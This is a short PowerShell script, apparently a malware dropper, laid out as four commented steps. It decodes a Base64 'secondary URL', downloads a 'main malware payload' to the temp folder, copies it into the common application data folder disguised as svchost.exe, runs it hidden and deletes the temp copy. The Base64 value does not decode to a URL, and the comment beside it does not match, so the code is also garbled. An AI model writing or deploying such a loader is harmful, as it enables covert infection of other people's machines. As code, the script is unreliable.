# Step 1: De-archiving or decrypting the secondary URL hidden within its own code

$secondaryUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aWQgdG9vbHMgZGVhY2hlZCBkb3duZWQgYXJ0IGxvZw=="))  # "def the secondary URL here"

# Step 2: Fetching the main malware payload from the URL

Invoke-WebRequest -Uri $secondaryUrl -OutFile "$env:TEMP\payload.exe"
$payloadPath = "$env:TEMP\payload.exe"

# Step 3: File placement

$malwareName = "svchost.exe"
$systemFolder = [System.Environment]::GetFolderPath("CommonApplicationData")
$malwarePath = Join-Path $systemFolder $malwareName
Copy-Item -Path $payloadPath -Destination $malwarePath -Force

# Step 4: Triggering the payload

Start-Process $malwarePath -WindowStyle Hidden
Remove-Item $payloadPath -Force
exit
